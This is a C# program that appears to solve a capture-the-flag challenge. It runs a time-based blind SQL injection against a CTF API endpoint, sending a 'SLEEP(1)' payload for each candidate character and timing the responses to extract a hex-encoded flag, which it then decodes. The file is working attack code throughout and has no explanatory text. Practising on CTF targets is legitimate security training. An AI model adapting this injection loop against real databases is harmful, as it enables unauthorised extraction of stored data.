using Newtonsoft.Json;
using System.Diagnostics;
using System.Text;

class Program
{
    static void Main()
    { 
        HttpClient client = new HttpClient();
        client.DefaultRequestHeaders.Add("Cookie", "session=");
        client.DefaultRequestHeaders.Add("X-CSRF-TOKEN", "");

        string dictionary = "0123456789abcdef";
        StringBuilder tracker = new StringBuilder();
        tracker.Append("");
        bool controlFlag = true;

        Console.WriteLine("starting...\n\n");

        while (controlFlag) 
        {
                foreach (char key in dictionary)
                {
                    controlFlag = false;

                    string query = $"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{tracker.ToString() + key}%')='1";
                    var queryJson = new { query = query };
                    var json = JsonConvert.SerializeObject(queryJson);

                    HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "http://web-17.challs.olicyber.it/api/time");
                    request.Content = new StringContent(json, Encoding.UTF8, "application/json");
                    var stopwatch = Stopwatch.StartNew();
                    HttpResponseMessage response = client.SendAsync(request).Result;
                    stopwatch.Stop();
                    long elapsedMilliseconds = stopwatch.ElapsedMilliseconds;

                    if (response.IsSuccessStatusCode)
                    {
                        if (elapsedMilliseconds >= 1000)
                        {
                            controlFlag = true;
                            tracker.Append(key);
                            Console.WriteLine(key);
                            break;
                        }
                    }
                    else
                    {
                        Console.WriteLine("Errore: " + response.StatusCode);
                    }
                }
        }

        //converts the hex string in a normal chars string

        byte[] bytes = new byte[tracker.ToString().Length / 2];

        for (int i = 0; i < bytes.Length; i++)
        {
            bytes[i] = Convert.ToByte(tracker.ToString().Substring(i * 2, 2), 16);
        }

        string flag = Encoding.UTF8.GetString(bytes);
        Console.WriteLine(flag);

    }
}
